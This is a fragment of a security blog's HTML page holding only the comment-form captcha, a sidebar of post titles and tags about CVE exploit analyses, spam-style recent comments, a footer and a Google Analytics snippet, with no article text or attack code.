<span class="wp_pineapple_div" style="cursor:pointer;height:50px;width:40px;display:inline-block;padding:2px;background-repeat:no-repeat;background-position:0 0;background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/apple.png);">
<input class="wp_pineapple_radio" style="display:none;" value="94d6683c0e0d279e5caa2747702799cc" name="wp_pineapple_fruit" type="radio">
</span>
<span class="wp_pineapple_div" style="cursor:pointer;height:50px;width:40px;display:inline-block;padding:2px;background-repeat:no-repeat;background-position:0 0;background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/apple.png);background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/banana.png);">
<input class="wp_pineapple_radio" style="display:none;" value="cff9a43e0c4b84727e4199bd5c748ec7" name="wp_pineapple_fruit" type="radio">
</span>
<span class="wp_pineapple_div" style="cursor:pointer;height:50px;width:40px;display:inline-block;padding:2px;background-repeat:no-repeat;background-position:0 0;background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/apple.png);background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/banana.png);background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/pineapple.png);">
<input class="wp_pineapple_radio" style="display:none;" value="7f6e10795305d69c25566f9cd40491a1" name="wp_pineapple_fruit" type="radio">
</span>
<span class="wp_pineapple_div" style="cursor:pointer;height:50px;width:40px;display:inline-block;padding:2px;background-repeat:no-repeat;background-position:0 0;background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/apple.png);background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/banana.png);background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/pineapple.png);background-image:url(http://www.secniu.com/wp-content/plugins/wp-pineapple/images/grapes.png);">
<input class="wp_pineapple_radio" style="display:none;" value="6dc7a0c30b4876ac6245e99011e3da93" name="wp_pineapple_fruit" type="radio">
</span>
</div>
					</form>
							</div><!-- #respond -->
							</div></div><!-- #comments --></div>
</div>
</article>
<div class="col-lg-4 col-md-4 sidebar">
	<div class="clean"></div><aside class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">My Sec Points</h3></div>				<ul>
						<li>You need to be logged in to view your points.</li>
										</ul>
			</aside>		<div itemscope="" itemtype="http://schema.org/ItemList">
		<aside class="panel panel-default">		<div class="panel-heading"><h3 class="panel-title"><span itemprop="name">Recent Posts</span></h3></div>		<ul class="list-group">
			
			<a href="http://www.secniu.com/%e5%8d%81%e8%a1%8c%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e7%bd%91%e7%bb%9c%e7%9a%84%e5%85%a8%e7%ab%af%e5%8f%a3%e7%9b%91%e5%90%ac/" class="list-group-item" itemprop="url">
			  <span class="list-group-item-heading h5">
			  			  <span itemprop="itemListElement">十行代码实现网络的全端口监听</span>
			  			  </span>
			</a>
			
			<a href="http://www.secniu.com/cve-2015-0311-debug-notes/" class="list-group-item" itemprop="url">
			  <span class="list-group-item-heading h5">
			  			  <span itemprop="itemListElement">CVE-2015-0311 debug notes</span>
			  			  </span>
			</a>
			
			<a href="http://www.secniu.com/a-funny-suspected-malicious-softwarenotepad-exe-analysis/" class="list-group-item" itemprop="url">
			  <span class="list-group-item-heading h5">
			  			  <span itemprop="itemListElement">A funny suspected malicious software(notepad.exe) analysis</span>
			  			  </span>
			</a>
			
			<a href="http://www.secniu.com/englishversioncve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/" class="list-group-item" itemprop="url">
			  <span class="list-group-item-heading h5">
			  			  <span itemprop="itemListElement">[EnglishVersion]CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit</span>
			  			  </span>
			</a>
			
			<a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/" class="list-group-item" itemprop="url">
			  <span class="list-group-item-heading h5">
			  			  <span itemprop="itemListElement">CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit</span>
			   <span class="label label-success">推荐</span> 			  </span>
			</a>
				</ul>
		</aside>		</div>
<aside class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Recent Comments</h3></div><ul id="recentcomments" class="list-group"><li class="list-group-item"><a href="http://questbars.cf/" rel="external nofollow" class="url">quest bars</a> on <a href="http://www.secniu.com/why-my-shellcode-cannot-work/#comment-69500">Why My ShellCode Cannot Work</a></li><li class="list-group-item"><a href="http://www.soopervideo.org/post/bunions-cause-and-effect" rel="external nofollow" class="url">Grow Taller Supplement</a> on <a href="http://www.secniu.com/cve-2015-0311-debug-notes/#comment-69487">CVE-2015-0311 debug notes</a></li><li class="list-group-item"><a href="http://ceh.vn/" rel="external nofollow" class="url">hoangcuongflp</a> on <a href="http://www.secniu.com/cve-2014-0502-flash-exploit-sample/#comment-69483">CVE-2014-0502 flash exploit sample</a></li><li class="list-group-item">jiangnan on <a href="http://www.secniu.com/why-my-shellcode-cannot-work/#comment-69482">Why My ShellCode Cannot Work</a></li><li class="list-group-item"><a href="http://www.facebook.com/profile.php?id=100003469594282" rel="external nofollow" class="url">Edson</a> on <a href="http://www.secniu.com/cve-2014-4114-sample/#comment-69473">CVE-2014-4114 sample</a></li></ul></aside><aside class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Tags</h3></div><div class="panel-body"><a href="http://www.secniu.com/tag/0-day/" class="tag-link-22" title="1 topic" style="font-size: 8pt;">0 day</a>
<a href="http://www.secniu.com/tag/apt/" class="tag-link-12" title="2 topics" style="font-size: 13.25pt;">APT</a>
<a href="http://www.secniu.com/tag/aslr/" class="tag-link-25" title="2 topics" style="font-size: 13.25pt;">ASLR</a>
<a href="http://www.secniu.com/tag/cve-2012-1889/" class="tag-link-26" title="1 topic" style="font-size: 8pt;">CVE-2012-1889</a>
<a href="http://www.secniu.com/tag/cve-2013-3346/" class="tag-link-10" title="1 topic" style="font-size: 8pt;">CVE-2013-3346</a>
<a href="http://www.secniu.com/tag/cve-2013-3918/" class="tag-link-19" title="1 topic" style="font-size: 8pt;">CVE-2013-3918</a>
<a href="http://www.secniu.com/tag/cve-2013-5065/" class="tag-link-9" title="2 topics" style="font-size: 13.25pt;">CVE-2013-5065</a>
<a href="http://www.secniu.com/tag/cve-2014-0322/" class="tag-link-21" title="1 topic" style="font-size: 8pt;">CVE-2014-0322</a>
<a href="http://www.secniu.com/tag/cve-2014-1767/" class="tag-link-37" title="1 topic" style="font-size: 8pt;">CVE-2014-1767</a>
<a href="http://www.secniu.com/tag/cve-2014-4114/" class="tag-link-36" title="1 topic" style="font-size: 8pt;">CVE-2014-4114</a>
<a href="http://www.secniu.com/tag/cve-2015-0311/" class="tag-link-39" title="1 topic" style="font-size: 8pt;">CVE-2015-0311</a>
<a href="http://www.secniu.com/tag/dep/" class="tag-link-33" title="1 topic" style="font-size: 8pt;">DEP</a>
<a href="http://www.secniu.com/tag/dve/" class="tag-link-34" title="1 topic" style="font-size: 8pt;">DVE</a>
<a href="http://www.secniu.com/tag/exploit/" class="tag-link-7" title="4 topics" style="font-size: 19.666666666667pt;">Exploit</a>
<a href="http://www.secniu.com/tag/flash/" class="tag-link-40" title="1 topic" style="font-size: 8pt;">flash</a>
<a href="http://www.secniu.com/tag/ie/" class="tag-link-20" title="5 topics" style="font-size: 22pt;">IE</a>
<a href="http://www.secniu.com/tag/java/" class="tag-link-6" title="1 topic" style="font-size: 8pt;">Java</a>
<a href="http://www.secniu.com/tag/linux-cve-2013-1763/" class="tag-link-5" title="1 topic" style="font-size: 8pt;">Linux CVE-2013-1763</a>
<a href="http://www.secniu.com/tag/pdf/" class="tag-link-13" title="1 topic" style="font-size: 8pt;">PDF</a>
<a href="http://www.secniu.com/tag/privilge-escalation/" class="tag-link-15" title="2 topics" style="font-size: 13.25pt;">Privilge Escalation</a>
<a href="http://www.secniu.com/tag/shellcode/" class="tag-link-11" title="1 topic" style="font-size: 8pt;">shellcode</a>
<a href="http://www.secniu.com/tag/vbscript/" class="tag-link-35" title="1 topic" style="font-size: 8pt;">VBScript</a>
<a href="http://www.secniu.com/tag/vulnerability/" class="tag-link-23" title="1 topic" style="font-size: 8pt;">Vulnerability</a>
<a href="http://www.secniu.com/tag/windows-xp-sp3/" class="tag-link-14" title="1 topic" style="font-size: 8pt;">Windows xp sp3</a></div>
</aside><aside class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Meta</h3></div>			<ul class="list-group">
			<li class="list-group-item"><a href="http://www.secniu.com/wp-login.php?action=register">Register</a>			</li><li class="list-group-item"><a href="http://www.secniu.com/wp-login.php">Log in</a></li>
			<li class="list-group-item"><a href="http://www.secniu.com/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li class="list-group-item"><a href="http://www.secniu.com/comments/feed/" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li class="list-group-item"><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>						</ul>
</aside></div>
<div class="clean"></div>
</div>
<footer id="footer">
	<div class="col-lg-12 col-md-12">
		<div class="container">
			<div class="panel panel-default">
						  <div class="panel-footer">
				<span class="text-muted pull-left">© 2018 <a href="http://www.secniu.com/">SecNiu</a> 版权所有  </span>
				<div class="clean"></div>
			  </div>
			</div>
		</div>
	</div>

</footer>


<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-36053291-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</body></html>